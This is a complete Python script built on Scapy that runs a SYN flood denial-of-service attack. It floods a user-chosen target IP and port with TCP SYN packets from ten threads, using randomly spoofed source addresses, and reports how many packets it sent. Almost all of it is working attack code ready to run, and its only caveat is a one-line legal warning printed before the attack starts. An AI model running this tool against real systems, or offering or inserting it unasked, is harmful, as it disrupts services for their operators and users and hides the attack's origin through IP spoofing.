#!/usr/bin/env python3
# SYN Flood Attack (Denial of Service - DoS)

from scapy.all import *
import threading
import random
import time
import os
import signal
import sys

class SynFloodAttack:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.attack_duration = int(duration)
        self.running = False
        self.start_time = None
        
        # Attack statistics
        self.stats = {
            'syn_packets_sent': 0,
            'errors': 0,
            'start_time': None,
            'end_time': None
        }

    def generate_spoofed_ip(self):
        """Generates a random spoofed IP address."""
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    def syn_flood(self):
        """Continuously sends SYN packets to the target."""
        while self.running:
            try:
                # Generate a random source IP
                src_ip = self.generate_spoofed_ip()
                
                # Generate a random source port
                src_port = random.randint(1024, 65535)
                
                # Create SYN packet
                packet = IP(src=src_ip, dst=self.target_ip) / TCP(sport=src_port, dport=self.target_port, flags="S")
                
                # Send the packet
                send(packet, verbose=0)
                
                # Update statistics
                self.stats['syn_packets_sent'] += 1
            except Exception as e:
                self.stats['errors'] += 1
                time.sleep(0.05)  # Small delay to avoid overwhelming the system

    def start(self):
        """Starts the attack."""
        if os.getuid() != 0:
            print("❌ This script requires root privileges (sudo).")
            return
        
        self.running = True
        self.stats['start_time'] = time.time()
        self.start_time = time.time()

        print(f"\n🚀 Starting SYN Flood Attack!")
        print(f"   • Target IP: {self.target_ip}")
        print(f"   • Target Port: {self.target_port}")
        print(f"   • Duration: {self.attack_duration}s\n")
        
        # Start multiple attack threads (for concurrency)
        num_threads = 10  # You can adjust this to the desired number of threads
        for _ in range(num_threads):
            threading.Thread(target=self.syn_flood, daemon=True).start()

        # Attack duration loop
        try:
            while self.running and (time.time() - self.start_time < self.attack_duration):
                elapsed = time.time() - self.start_time
                print(
                    f"\r⏱ {elapsed:.1f}s/{self.attack_duration}s | "
                    f"SYN Packets Sent: {self.stats['syn_packets_sent']} | "
                    f"Errors: {self.stats['errors']}",
                    end='', flush=True
                )
                time.sleep(0.05)
        except KeyboardInterrupt:
            print("\n🛑 Stopped by user!")

        self.stop()

    def stop(self):
        """Stops the attack."""
        self.running = False
        self.stats['end_time'] = time.time()

        print("\n\n📊 Attack Report:")
        print(f"   • Duration: {self.stats['end_time'] - self.stats['start_time']:.1f}s")
        print(f"   • SYN Packets Sent: {self.stats['syn_packets_sent']}")
        print(f"   • Errors: {self.stats['errors']}\n")

def signal_handler(sig, frame):
    print("\n🛑 Received termination signal!")
    attacker.stop()
    sys.exit(0)

def get_user_input(prompt, default=None):
    """Gets user input with a default value."""
    user_input = input(f"{prompt} [{default}]: ")
    return user_input.strip() if user_input.strip() else default

def main():
    global attacker

    target_ip = get_user_input("Enter target IP address")
    target_port = get_user_input("Enter target port", "80")
    duration = get_user_input("Enter attack duration in seconds", "30")

    print("\n⚠️ LEGAL WARNING: Use this script only on networks you own or have permission to test!\n")

    attacker = SynFloodAttack(target_ip, target_port, duration)
    signal.signal(signal.SIGINT, signal_handler)
    attacker.start()

if __name__ == "__main__":
    main()
